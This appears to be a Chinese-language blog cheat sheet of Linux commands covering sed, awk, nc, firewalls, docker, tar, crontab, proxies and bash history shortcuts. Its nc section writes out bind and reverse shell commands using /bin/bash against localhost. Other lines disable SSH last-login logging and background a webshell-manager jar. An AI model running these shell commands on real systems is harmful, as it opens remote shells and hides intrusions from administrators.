+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">linux创建链接软命令,<span class="built_in">ln</span> -s 源文件 目标文件</span></span><br><span class="line">ln -s /usr/bin/whoami /usr/bin/n1h1l157</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f命令的意思是强制执行,意味着如果不存在就执行创建,存在就执行覆盖掉</span></span><br><span class="line">ln -sf /usr/bin/id /usr/bin/n1h1l157</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20046.png" alt></p>
+<h2 id="vim"><a class="markdownIt-Anchor" href="#vim">#</a> vim</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux所有行用vim进行前缀插入</span></span><br><span class="line">:%s/^/Prefix</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20047.png" alt><br>
+<img data-src="/N1h1l157/Linux/20048.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Linux所有行用vim进行后缀插入</span><br><span class="line">:%s/$/Suffix</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20049.png" alt><br>
+<img data-src="/N1h1l157/Linux/20050.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># linux vim删除多行内容:</span></span><br><span class="line">将光标移动到需要删除的行，按一下ESC键，确保退出编辑模式</span><br><span class="line">在dd命令前面加上要删除的行数,如要删除第<span class="number">4</span>行以下的<span class="number">3</span>行，按下<span class="number">3</span> dd</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20051.png" alt></p>
+<h2 id="sed"><a class="markdownIt-Anchor" href="#sed">#</a> sed</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加行</span></span><br><span class="line">sed -i &#x27;5i\ new line&#x27; deafult.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20052.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 删除行</span><br><span class="line">sed -i <span class="string">&#x27;5,7d&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20053.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看行</span><br><span class="line">sed -n <span class="string">&#x27;4,8p&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20054.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 首行尾行都添加单引号</span><br><span class="line">sed <span class="string">&#x27;s/^/&quot;/;s/$/&quot;/&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20055.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关闭最后登陆的日志</span><br><span class="line">sed -i <span class="string">&#x27;s/#PrintLastLog yes/PrintLastLog no/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20056.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启最后登陆的日志</span><br><span class="line">sed -i <span class="string">&#x27;s/PrintLastLog no/#PrintLastLog yes/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20057.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启网络传输日志</span><br><span class="line">sed -i <span class="string">&#x27;s/#Banner none/Banner \/etc\/issue.net/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd;echo -e <span class="string">&quot;hellow\nworld&quot;</span> &gt; /etc/issue.net</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20058.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关闭网络传输日志</span><br><span class="line">sed -i <span class="string">&#x27;s/Banner \/etc\/issue.net/#Banner none/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd;echo &gt; /etc/issue.net</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20059.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭 logo 显示</span></span><br><span class="line">修改 ~/.bashrc, 注释掉 neofetch</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20060.png" alt></p>
+<h2 id="awk"><a class="markdownIt-Anchor" href="#awk">#</a> awk</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">awk打印具体列数</span></span><br><span class="line">netstat -tunlp | grep 10086 | awk &#x27;&#123;print $7&#125;&#x27; | cut -d &#x27;/&#x27; -f 1</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20062.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#删除第一列</span><br><span class="line">ll | awk <span class="string">&#x27;&#123;$1=&quot;&quot;;print $0&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20064.png" alt></p>
+<h2 id="history"><a class="markdownIt-Anchor" href="#history">#</a> history</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">过滤出10条最常用的命令</span></span><br><span class="line">history | awk &#x27;&#123;CMD[$2]++;count++;&#125; END &#123; for (a in CMD )print CMD[ a ]&quot; &quot; CMD[ a ]/count*100 &quot;% &quot; a &#125;&#x27; | grep -v &quot;./&quot; | column -c3 -s &quot; &quot; -t |sort -nr | nl | head -n10</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20065.png" alt></p>
+<h2 id="nc"><a class="markdownIt-Anchor" href="#nc">#</a> nc</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc测试本地端口是否开放</span></span><br><span class="line">nc -zv localhost 10086</span><br><span class="line">telnet 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20066.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#nc通过终端聊天</span></span><br><span class="line">nc -lvvp <span class="number">4444</span></span><br><span class="line">nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20067.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 正向反弹shell</span><br><span class="line">被控端：nc -lvp <span class="number">4444</span> -e /bin/bash</span><br><span class="line">控制端：nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20068.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 反向反弹shell：</span><br><span class="line">控制端：nc -lvp <span class="number">4444</span></span><br><span class="line">被控端：nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">4444</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20069.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 反弹shell，在被控端输入信息，将被控端的信息全部导出到回显端</span><br><span class="line">被控端：/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span> | nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">4444</span></span><br><span class="line">回显端：nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20070.png" alt><br>
+<img data-src="/N1h1l157/Linux/20071.png" alt></p>
+<h2 id="firewalld"><a class="markdownIt-Anchor" href="#firewalld">#</a> firewalld</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">yum install firewalld</span><br><span class="line">systemctl status firewalld </span><br><span class="line">systemctl restart firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20072.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开启端口</span><br><span class="line">firewall-cmd --zone=public --<span class="built_in">list</span>-ports</span><br><span class="line">firewall-cmd --zone=public --add-port=<span class="number">10086</span>/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20073.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 关闭端口</span><br><span class="line">firewall-cmd --zone=public --<span class="built_in">list</span>-ports</span><br><span class="line">firewall-cmd --zone=public --remove-port=<span class="number">10086</span>/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20074.png" alt></p>
+<h2 id="nohup"><a class="markdownIt-Anchor" href="#nohup">#</a> nohup</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有日志的后台输出</span></span><br><span class="line">nohup java -jar Behinder.jar &amp;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20076.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 无日志的后台输出</span><br><span class="line">nohup java -jar Behinder.jar &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20075.png" alt></p>
+<h2 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> docker</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询所有的容器，过滤出Exited状态的容器，列出容器ID，删除这些容器</span></span><br><span class="line">docker rm `docker ps -a|grep Exited|awk &#x27;&#123;print $1&#125;&#x27;`</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20077.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#删掉所有的docker镜像</span><br><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20078.png" alt><br>
+<img data-src="/N1h1l157/Linux/20079.png" alt></p>
+<h2 id="rpm"><a class="markdownIt-Anchor" href="#rpm">#</a> rpm</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个包</span></span><br><span class="line">rpm -ivh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 升级一个包</span><br><span class="line">rpm -Uvh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 卸载一个包</span><br><span class="line">rpm -e</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#查询当前安装的所有rpm包</span><br><span class="line">rpm -qa </span><br><span class="line">rpm -qa | grep -i chrome</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询httpd安装路径</span><br><span class="line">rpm -ql 包全名 </span><br></pre></td></tr></table></figure>
+<h2 id="tar"><a class="markdownIt-Anchor" href="#tar">#</a> tar</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩、解压gz文件</span></span><br><span class="line">tar -zcvf filename.tar.gz filename</span><br><span class="line">tar -zxvf filarename.tar.gz</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20080.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 压缩当前目录下全部内容、解压zip文件</span><br><span class="line">zip -r filename.zip .<span class="comment">/*</span></span><br><span class="line"><span class="comment">unzip filename.zip</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20081.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 指定解压路径</span><br><span class="line">tar -zxvf ../<span class="number">1.</span>tar.gz -C ../</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20082.png" alt></p>
+<h2 id="iconv"><a class="markdownIt-Anchor" href="#iconv">#</a> iconv</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取归属地并编码为utf-8</span></span><br><span class="line">curl http://whois.pconline.com.cn/ip.jsp -s | iconv -f gbk -t utf8 &gt; /tmp/x ; vim /tmp/x +&quot;d1&quot; +&quot;d1&quot; +&quot;wq&quot;;cat /tmp/x</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20083.png" alt></p>
+<h2 id="tail"><a class="markdownIt-Anchor" href="#tail">#</a> tail</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排除第一行的日志</span></span><br><span class="line">cat deafult.txt | tail -n +2</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20084.png" alt></p>
+<h2 id="lrzsz"><a class="markdownIt-Anchor" href="#lrzsz">#</a> lrzsz</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如xshell或者SecureCRT才可以使用,需要修改默认路径</span></span><br><span class="line">yum install -y lrzsz.x86_64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sz：将选定的文件发送（send）到本地机器</span></span><br><span class="line">sz 1.tar.gz</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20086.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># rz：运行该命令会弹出一个文件选择窗口，从本地选择文件上传到服务器(receive)</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20085.png" alt></p>
+<h2 id="eof"><a class="markdownIt-Anchor" href="#eof">#</a> EOF</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">EOF 基本使用</span></span><br><span class="line">cat &gt; .. &lt;&lt; EOF</span><br><span class="line">xxx</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20087.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接在宿主机上执行命令</span></span><br><span class="line">ssh -T root@10.255.200.72 &#x27;id&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不产生交互式shell, 直接执行命令</span></span><br><span class="line">ssh -T root@10.255.200.72 &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">whoami</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20088.png" alt></p>
+<h2 id="iptables"><a class="markdownIt-Anchor" href="#iptables">#</a> iptables</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否安装</span></span><br><span class="line">iptables -V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">yum install iptables-services</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看防火墙的状态 </span><br><span class="line">systemctl status iptables.service </span><br><span class="line">systemctl stop iptables.service </span><br><span class="line">systemctl start iptables.service </span><br><span class="line">systemctl restart iptables.service</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20089.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询防火墙开放端口</span><br><span class="line">iptables -L -n</span><br><span class="line">iptables --<span class="built_in">list</span>-rules</span><br><span class="line">iptables -L -n --line-number</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20090.png" alt><br>
+<img data-src="/N1h1l157/Linux/20091.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 允许所有服务器访问指定端口</span><br><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport <span class="number">22</span> -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport <span class="number">80</span> -j ACCEPT</span><br><span class="line"></span><br><span class="line"># 保存iptables规则</span><br><span class="line">service iptables save</span><br><span class="line"></span><br><span class="line"># 查看iptables的配置文件</span><br><span class="line">cat /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20092.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将新增的规则放在iptables规则页的首处</span><br><span class="line">iptables -I INPUT -p tcp --dport <span class="number">111</span> -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20093.png" alt></p>
+<h2 id="crontab"><a class="markdownIt-Anchor" href="#crontab">#</a> crontab</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑定时任务</span></span><br><span class="line">crontab -e</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">“*”表示“任意值”，分别为 分、时、天、月、周</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示任务将在每个星期日的凌晨2点40分执行</span></span><br><span class="line">“40 2 * * 0”</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每两天运行一次的任务，<span class="string">&quot;*/2&quot;</span>表示每隔两天</span></span><br><span class="line">&quot;* * */2 * *&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任务将在每天凌晨3点执行</span></span><br><span class="line">&quot;0 3 * * *&quot;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20094.png" alt></p>
+<h2 id="ufw"><a class="markdownIt-Anchor" href="#ufw">#</a> ufw</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装防火墙</span></span><br><span class="line">yum install ufw</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 开启关闭</span><br><span class="line">ufw enable</span><br><span class="line">ufw status</span><br><span class="line">ufw status verbose</span><br><span class="line">ufw disable</span><br><span class="line">ufw allow 10086</span><br><span class="line">ufw delete allow 10086</span><br></pre></td></tr></table></figure>
+<h2 id="proxychians4"><a class="markdownIt-Anchor" href="#proxychians4">#</a> proxychians4</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看使用的代理</span></span><br><span class="line">cat /opt/homebrew/etc/proxychains.conf | tail -n 2 | grep -v &quot;#&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">要使用brew的curl才可以</span></span><br><span class="line">proxychains4 /opt/homebrew/Cellar/curl/8.0.1/bin/curl 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20095.png" alt></p>
+<h2 id="export"><a class="markdownIt-Anchor" href="#export">#</a> export</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置代理</span></span><br><span class="line">export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消代理</span></span><br><span class="line">unset http_proxy &amp; unset https_proxy</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20096.png" alt></p>
+<h2 id="ˆliˆil"><a class="markdownIt-Anchor" href="#ˆliˆil">#</a> ˆliˆil</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ˆoldˆnew。假如我在查看 file1 后 接着想查看 file4，那么只要执行 ˆ1ˆ4：</span></span><br><span class="line">cat file1 </span><br><span class="line">ˆ1ˆ4 </span><br><span class="line">cat file4</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20097.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 有时候我们想不只替换一处，而是把上一条命令中的每处内容都替换掉。要实现这种效果，可以使用 !:gs/old/new</span><br><span class="line">cat file4.txt file5.txt</span><br><span class="line">!:gs/file/nnn</span><br><span class="line">cat nnn4.txt nnn5.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20098.png" alt></p>
+<h2 id><a class="markdownIt-Anchor" href="#">#</a> !!</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">!! 让我们以最快的方式重复执行上一条命令</span></span><br><span class="line">id </span><br><span class="line">!!</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20099.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># !! 经常与 sudo 联用，用来解决缺少权限的问题。例如：</span><br><span class="line">whoami</span><br><span class="line">sudo !! </span><br><span class="line">sudo whoami</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20100.png" alt></p>
+<h2 id="-2"><a class="markdownIt-Anchor" href="#-2">#</a> !</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用 !foo 这种表示法允许我们执行以 foo 这三个字符打头的命令。Shell 将 以逆序的方式搜索历史命令列表，一旦与给定的开头字符匹配到，便予以执行该条命令。</span></span><br><span class="line">!he </span><br><span class="line">help</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 ! 后面除了可以跟一个字符串之外，也可以跟一个数字。这个数字代表历史 命令列表中的编号。当我们用 <span class="built_in">history</span> 查看历史命令列表时，命令左边显示的 即是该行命令的编号。</span></span><br><span class="line">history 5</span><br><span class="line">!52</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20101.png" alt></p>
